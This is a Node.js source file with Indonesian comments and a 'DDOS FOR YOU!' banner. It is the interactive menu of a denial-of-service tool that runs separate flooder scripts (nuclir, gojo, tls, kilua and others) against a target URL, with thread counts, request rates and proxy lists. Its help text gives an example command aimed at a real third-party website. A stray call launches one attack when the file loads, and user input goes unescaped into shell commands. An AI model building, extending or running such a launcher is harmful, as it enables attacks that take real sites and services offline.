const { exec } = require('child_process');
const readline = require('readline');
const chalk = require('chalk');
const figlet = require('figlet');

// Membuat interface pembacaan dari stdin
const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

// Menampilkan ASCII art dengan warna ungu
function showAsciiArt() {
    console.log(chalk.green.bold(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣶⣿⣟⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⡿⣿⣿⣿⣿⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢀⣿⣿⣿⣿⣿⣿⣿⢿⣿⡇⢹⣿⣿⣿⠈⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣼⣿⣿⣿⣿⣿⣿⡟⢸⣿⡇⠈⣿⣿⣿⠀⢧⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀
⢀⣿⣿⣿⣿⣿⡿⣿⣷⠸⣿⡇⠀⠹⣿⣿⣇⢈⣧⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀⠀⠀
⣸⣿⣿⣿⣿⣿⡇⣿⣾⡄⣿⡇⣀⣤⠽⣿⣿⡉⠉⢧⠻⣿⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀
⣿⢸⣿⣿⣿⣿⣧⣿⣿⢱⣻⡇⠀⠀⠀⠙⢻⣷⣄⣀⢳⣽⣏⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀
⣿⣾⣿⣿⣿⣿⡏⣿⣾⠀⠻⣧⠀⠠⢖⣫⣽⣿⣿⣿⣿⣿⣿⡿⣿⣿⣿⣿⣿⣿⣿⣿⡗⠚⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⠀⠀⠀⠀⠀
⠛⣿⣿⣿⣿⡏⣧⣿⠿⡄⠀⠘⢧⠀⠸⡿⠋⠁⠈⢿⣿⣿⠗⢷⠘⣾⣿⣿⣿⣿⣿⣿⣅⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀
⢸⢹⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⠁⠀⠀⠀⠤⠦⠒⠉⠀⠀⠀⢧⠘⣿⣿⣿⣿⣿⣿⣧⠱⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢷⠀⠀⠀⠀
⣿⢸⣿⣿⣿⣿⣇⡈⢻⡟⠓⠤⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢧⣿⣿⣿⣿⣿⣿⡿⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⣇⠀⠀⠀
⡿⢸⣿⣿⣿⣿⣿⡈⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⢸⠀⠀⠀
⡇⠸⣿⣿⣿⣿⣿⡇⣞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⢸⠀⠀⠀
⣧⠀⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢻⣿⢹⣿⣏⣾⣏⣠⡧⠤⣄⣀
⣿⠀⣿⣿⣿⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡜⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⢻⣿⡼⠟⠸⠛⠁⠀⠀⠀⠀⠀
⢹⠀⢻⣿⣿⣿⣿⣿⣿⣆⠀⠀⠀⢤⣤⣤⡤⠀⠀⠀⠀⠀⠀⠀⠀⡇⣸⣿⣿⣿⣿⡟⣿⣿⣿⣿⣿⣿⣿⣯⡿⣿⣿⢃⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠈⡇⠸⣿⣿⣿⣿⣿⣿⣿⣷⣀⠀⠘⠦⠤⠄⠀⠀⠀⠀⠀⠀⠀⢰⠇⣿⣿⣿⣿⣿⡇⣿⣿⣿⣿⣿⣿⣿⡾⢡⣿⢻⡞⠁⢀⣀⣀⣀⣀⠀⠀⠀⣀⠰⠚
⠀⢹⠀⣿⣿⡇⣿⣿⣿⣿⣿⠟⠳⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣸⣰⣿⣿⣿⣿⣿⠀⢹⣿⡿⣿⣿⣿⠟⠁⣼⠁⣸⠚⠉⠁⠀⠀⠀⠀⣠⠴⠋⠁⠀⠀
⠀⠈⢳⣸⣿⡇⢻⣿⣿⣿⣿⣦⠀⢸⡷⣄⠀⠀⣀⣀⡤⢶⡋⠁⢨⢹⣿⣿⣿⣿⡇⠀⠸⣿⣧⣿⡿⠁⠀⢸⠃⢠⡇⠀⠀⠀⠀⢀⡴⠚⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠈⣿⣇⡀⢻⣿⣿⢹⡇⠀⢸⣧⡈⠉⠉⠁⠀⠀⠀⠉⠓⢒⣿⢻⣿⣿⢷⣧⡀⢠⣷⡈⠛⠀⠀⢀⠏⢠⠏⠀⠀⠀⣠⠖⠉⠀⠀⠀⢀⣀⡤⠄⠂
⠀⠀⠀⠀⠸⣿⡇⠀⢻⣿⣧⢧⡐⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⢃⣿⠿⣡⡏⢹⣿⡾⠁⠀⠀⠀⠀⢸⢠⠏⠀⠀⡤⠞⠁⠀⣠⠴⠒⠋⠉⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠘⣿⠀⠀⠙⢷⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠴⠟⢁⡾⠋⣰⢿⠁⡾⠀⣧⡀⠀⠀⠀⠀⠘⡾⠀⡴⠎⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠙⠓• DEVELOPER : GuzzxOFFC⢠⣷⡟⠀⠃⠀⡿⣿⣄⠀⠀⠀⢰⠧⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀• VERSION : 4.4⠀⠀⠀⠀ ⠀⠀⠀⢸⢃⡇⠀⠀⠀⣿⡜⣟⠷⢤⣀⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀• DDOS FOR YOU!⠀⠀  ⠀   ⢠⣏⡼⠁⢸⠇⢀⠃⡇⢸⠀⢀⡞⠀⠀⠀
                     • TOTAL PROXY : 1000+
      `));
}

// Menampilkan detail GuzzxOFFC
function showGuzzxOFFCDetails() {
    console.log(chalk.red.bold('꧁>>𝕄𝔼ℕ𝕌<<꧂'));
    console.log(chalk.red.bold('  •help'));
    console.log(chalk.red.bold('  •clear'));
    console.log(chalk.red('· · • • • 𝕒𝕦𝕥𝕙𝕠𝕣 : 𝔾𝕦𝕫𝕫𝕩𝕆𝔽𝔽ℂ • • • · ·'));
    // Tambahkan detail GuzzxOFFC di sini
    console.log(chalk.red('CREATED BY GUZZXOFFC!! DONT RECODE!!'));
    console.log(chalk.red('====================='));
}

// Menampilkan prompt dengan user root GuzzxOFFC
function showPrompt() {
    rl.setPrompt(chalk.magenta('root@Guzzx:~# '));
    rl.prompt();
}

// Membersihkan layar terminal
function clearScreen() {
    // Jika dijalankan pada terminal Windows
    if (process.platform === 'win32') {
        exec('cls', (error, stdout, stderr) => {
            if (error) {
                console.error(`Error: ${error}`);
                return;
            }
            console.log(stdout);
            showAsciiArt();
            showGuzzxOFFCDetails();
            showPrompt();
        });
    }
    // Jika dijalankan pada terminal Linux atau macOS
    else {
        exec('clear', (error, stdout, stderr) => {
            if (error) {
                console.error(`Error: ${error}`);
                return;
            }
            console.log(stdout);
            showAsciiArt();
            showGuzzxOFFCDetails();
            showPrompt();
        });
    }
}

// Membersihkan layar saat aplikasi dimulai
clearScreen();

// Meng-handle input dari pengguna
rl.on('line', function(input) {
    const command = input.trim().split(' ');
    switch (command[0]) {
        case 'help':
            console.log(chalk.rgb(255, 0, 0).bold.italic('Pilih senjatamu:'));
            console.log(chalk.rgb(255, 105, 180).bold.italic('- Nuclir: Menyerang Gateway☢️'));
console.log(chalk.rgb(255, 127, 0).bold.italic('- Mix: Tembakan intensif 💥'));
console.log(chalk.rgb(255, 255, 0).bold.italic('- Gojo: Serangan dahsyat 🌀'));
console.log(chalk.rgb(0, 255, 0).bold.italic('- TLS: Serangan aman 🔒'));
console.log(chalk.rgb(0, 0, 255).bold.italic('- TLSv2: Enkripsi lanjutan 🔑'));
console.log(chalk.rgb(75, 0, 130).bold.italic('- Kilua: Presisi tajam 🗡️'));
console.log(chalk.rgb(75, 0, 130).bold.italic('- http: new killer seram 💀'));
console.log(chalk.rgb(148, 0, 211).bold('©2024 BY GUZZX OFFC'));
break;

case 'nuclir':
            if (command.length === 6) {
                console.log('Menjalankan nuclir.js...');
                runNuclir(command[1], command[2], command[3], command[4], command[5]);
                console.log(chalk.green.bold('SEDANG MENYERANG TARGET DENGAN SERANGAN NUCLIR☢️'));
            } else {
                console.log(chalk.red('Format perintah salah. Gunakan format: gojo url time thread rate proxy.txt'));
                console.log(chalk.red('example : nuclir https://xnxx.com/ 120 39 9 nuclir.txt'));
            }
            break;
   
            
        case 'mix':
            if (command.length === 5) {
                console.log('Menjalankan mix.js...');
                runMix(command[1], command[2], command[3], command[4]);
                console.log(chalk.green.bold('Mix telah berhasil dijalankan.'));
            } else {
                console.log(chalk.red('Format perintah salah. Gunakan format: mix url time thread rate'));
            }
            break;
        case 'gojo':
            if (command.length === 6) {
                console.log('Menjalankan gojov5.js...');
                runGojoV5(command[1], command[2], command[3], command[4], command[5]);
                console.log(chalk.green.bold('Gojo telah berhasil dijalankan.'));
            } else {
                console.log(chalk.red('Format perintah salah. Gunakan format: gojo url time thread rate proxy.txt'));
            }
            break;
        case 'tls':
            if (command.length === 6) {
                console.log('Menjalankan tls.js...');
                runTLS(command[1], command[2], command[3], command[4], command[5]);
                console.log(chalk.green.bold('TLS telah berhasil dijalankan.'));
            } else {
                console.log(chalk.red('Format perintah salah. Gunakan format: tls url time rate thread proxy.txt'));
            }
            break;
        case 'clear':
            clearScreen();
            break;
        case 'tlsv2':
            if (command.length === 3) {
                console.log('Menjalankan tlsv2.js...');
                runTlsv2(command[1],command[2]);
                console.log(chalk.green.bold(' SEDANG MENYERANG TARGET 💀💀💀•••.'));
            } else {
                console.log(chalk.red('Format perintah salah. Gunakan format: tlsv2 url time '));
            }
            break;
            case 'kilua':
    if (command.length === 7) {
        console.log('Menjalankan kilua.js...');
        runKilua(command[1], command[2], command[3], command[4], command[5], command[6]);
        console.log(chalk.green.bold('kilua telah berhasil dijalankan.'));
    } else {
        console.log(chalk.red('Format perintah salah. Gunakan format: kilua url time thread proxy.txt rate uam/captha'));
    }
    break;
case 'http':
    if (command.length === 3) {
        console.log('Menjalankan method2.js...');
        runHttp(command[1], command[2]);
        console.log(chalk.green.bold('http telah berhasil dijalankan.'));
    } else {
        console.log(chalk.red('Format perintah salah. Gunakan format: http url time'));
    }
    break;
        default:
            console.log(chalk.red('Perintah tidak valid, ketik "help" untuk bantuan.'));
            break;
    }
}).on('close', function() {
    console.log(chalk.yellow('Sampai jumpa lagi!'));
    process.exit(0);
});



// Fungsi untuk menjalankan file mix.js dengan format mix url time thread rate
function runMix(url, time, thread, rate) {
    exec(`node mix.js ${url} ${time} ${thread} ${rate}`, (error, stdout, stderr) => {
        if (error) {
            console.error(chalk.red(`Error: ${error.message}`));
            return;
        }
        if (stderr) {
            console.error(chalk.red(`stderr: ${stderr}`));
            return;
        }
        console.log(chalk.green(`stdout: ${stdout}`));
    });
}

// Fungsi untuk menjalankan file gojov5.js dengan format gojo url time thread rate proxy.txt
function runGojoV5(url, time, thread, rate, proxyFile) {
    exec(`node gojov5.js ${url} ${time} ${thread} ${rate} ${proxyFile}`, (error, stdout, stderr) => {
        if (error) {
            console.error(chalk.red(`Error: ${error.message}`));
            return;
        }
        if (stderr) {
            console.error(chalk.red(`stderr: ${stderr}`));
            return;
        }
        console.log(chalk.green(`stdout: ${stdout}`));
    });
}

// Fungsi untuk menjalankan file tls.js dengan format tls url time thread rate
function runTLS(url, time, rate, thread, proxyFile) {
    exec(`node tls.js ${url} ${time} ${rate} ${thread} ${proxyFile}`, (error, stdout, stderr) => {
        if (error) {
            console.error(chalk.red(`Error: ${error.message}`));
            return;
        }
        if (stderr) {
            console.error(chalk.red(`stderr: ${stderr}`));
            return;
        }
        console.log(chalk.green(`stdout: ${stdout}`));
    });
}
// Fungsi untuk menjalankan file tlsv2.js dengan format tlsv2 url time

function runTlsv2(url, time) {

    exec(`node tlsv2.js ${url} ${time}`, (error, stdout, stderr) => {

        if (error) {

            console.error(chalk.red(`Error: ${error.message}`));

            return;

        }

        if (stderr) {

            console.error(chalk.red(`stderr: ${stderr}`));

            return;

        }

        console.log(chalk.green(`stdout: ${stdout}`));

    });

}
// Fungsi untuk menjalankan file method1.js dengan format method1 url time rate thread
function runKilua(url, time, thread, proxyFile, rate, uam) {
    exec(`node kilua.js ${url} ${time} ${thread} ${proxyFile} ${rate} ${uam}`, (error, stdout, stderr) => {
        if (error) {
            console.error(chalk.red(`Error: ${error.message}`));
            return;
        }
        if (stderr) {
            console.error(chalk.red(`stderr: ${stderr}`));
            return;
        }
        console.log(chalk.green(`stdout: ${stdout}`));
    });
}

// Fungsi untuk menjalankan file nuclir.js dengan format gojo url time thread rate proxy.txt
function runNuclir(url, time, thread, rate, proxyFile) {
    exec(`node nuclir.js ${url} ${time} ${thread} ${rate} ${proxyFile}`, (error, stdout, stderr) => {
        if (error) {
            console.error(chalk.red(`Error: ${error.message}`));
            return;
        }
        if (stderr) {
            console.error(chalk.red(`stderr: ${stderr}`));
            return;
        }
        console.log(chalk.green(`stdout: ${stdout}`));
    });
}

// Contoh pemanggilan fungsi runKilua
runKilua('example.com', '10', '5', 'proxy.txt', '100', 'captcha123');


// Fungsi untuk menjalankan file method2.js dengan format method2 url time rate thread
function runHttp(url, time) {
    exec(`node http.js ${url} ${time}`, (error, stdout, stderr) => {
        if (error) {
            console.error(chalk.red(`Error: ${error.message}`));
            return;
        }
        if (stderr) {
            console.error(chalk.red(`stderr: ${stderr}`));
            return;
        }
        console.log(chalk.green(`stdout: ${stdout}`));
    });
}
